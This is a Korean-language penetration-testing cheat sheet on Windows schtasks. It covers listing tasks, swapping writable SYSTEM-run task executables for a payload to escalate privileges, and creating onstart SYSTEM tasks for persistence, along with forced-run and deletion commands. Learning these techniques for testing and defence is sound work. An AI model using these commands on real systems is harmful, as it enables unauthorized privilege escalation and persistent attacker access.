# schtasks — 예약 작업 열거·생성

- schtasks — Windows 예약 작업(Scheduled Task)을 명령줄에서 조회·생성·삭제하는 도구. 작업 스케줄러의 GUI 없이 cmd에서 모든 관리가 된다.
- 권한 상승에서 "다른 사용자(높은 권한)가 실행하는 작업의 실행 파일이 쓰기 가능한지"를 점검할 때, 그리고 지속성(persistence)으로 시스템 재시작 후에도 셸을 유지할 때.
- cmd.exe에서 실행하며 작업 생성·변경은 관리자 권한이 필요한 경우가 많다. 열거는 일반 사용자로도 가능하다.

## 예약 작업 열거

```powershell
# 모든 작업 목록
schtasks /query /fo LIST /v
# 표 형식으로 간단히
schtasks /query /fo TABLE
# 특정 작업 상세
schtasks /query /tn "TaskName" /fo LIST /v
```

- `/fo`는 출력 형식(TABLE·LIST·CSV), `/v`는 상세 정보(실행 명령·계정·마지막 실행 시각)다.
- 상세 출력에서 확인할 필드: Run As User(실행 계정), Task To Run(실행 파일 경로), Next Run Time.

## 권한 상승 점검 — 쓰기 가능한 실행 파일 찾기

```text
1. /v 로 실행 파일 경로 수집 (Task To Run)
2. icacls <경로> 로 현재 사용자의 권한 확인
3. SYSTEM·Administrator가 실행하는 작업의 파일에 W(쓰기)가 있으면 상승 후보
4. 실행 파일을 페이로드로 교체하고 다음 실행 시각을 기다리거나 강제 실행
```

```powershell
# 실행 파일 권한 확인
icacls C:\Scripts\maintenance.exe
# 수정 권한이 있으면 SYSTEM 컨텍스트로 실행되는 것을 교체 가능
copy payload.exe C:\Scripts\maintenance.exe
```

- 실행 파일 교체가 되지 않는 경우, 작업 자체를 새로 만들 수 있는 권한(SERVICE_CHANGE_CONFIG에 해당하는 작업 관리 권한)이 있는지 시험한다.

## 작업 생성 — 지속성

```powershell
# 부팅 시 SYSTEM 권한으로 실행되는 작업 (관리자 권한 필요)
schtasks /create /tn "Updater" /tr "C:\Temp\payload.exe" /sc onstart /ru SYSTEM

# 로그온 시 현재 사용자로 실행
schtasks /create /tn "UserTask" /tr "C:\Temp\payload.exe" /sc onlogon

# 매일 정해진 시각에 실행
schtasks /create /tn "DailyCheck" /tr "C:\Temp\payload.exe" /sc daily /st 09:00
```

- `/tn` 작업 이름, `/tr` 실행 명령, `/sc` 스케줄 종류(onstart·onlogon·daily·hourly·minute), `/st` 시각, `/ru` 실행 계정.
- 지속성 관점: onstart + SYSTEM 조합은 재부팅 후에도 SYSTEM 셸을 다시 연다. /ru SYSTEM은 관리자 권한 세션에서만 생성 가능하다.

## 강제 실행·삭제

```powershell
# 작업을 즉시 실행
schtasks /run /tn "Updater"
# 작업 중지
schtasks /end /tn "Updater"
# 작업 삭제
schtasks /delete /tn "Updater" /f
```

- `/run`으로 다음 스케줄을 기다리지 않고 바로 트리거한다. 실행 파일 교체 후 검증에 쓴다.
- `/f`는 확인 프롬프트를 건너뛰는 강제 옵션이다.

## GUI와 PowerShell 비교

```powershell
# PowerShell에서도 동일 관리가 가능하다 (보고서 형식이 다름)
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
Get-ScheduledTask -TaskName "Updater" | Select-Object -ExpandProperty Actions
```

- cmd의 schtasks 출력이 더 간결해 셸·웹셸 환경에서 선호된다.

## 트러블슈팅

- `Access is denied`로 /create·/run이 실패하면 권한이 부족한 것이다. SYSTEM 권한 작업 생성은 반드시 관리자 세션에서 한다.
- 작업이 실행되지 않으면 실행 계정 세션 문제(로그온하지 않은 계정)일 수 있다. /ru SYSTEM 또는 /rl HIGHEST를 확인한다.
- 경로에 공백이 있으면 /tr 인자 전체를 따옴표로 감싼다: /tr "C:\Program Files\App\tool.exe"
- 예약 작업 열거로도 경로가 안 보이면 권한이 없는 작업이다. 관리자 세션에서 다시 /query /v를 돌린다.
- 관련 문서: windows/powershell/powershell_privilege_escalation.md (예약 작업 섹션)
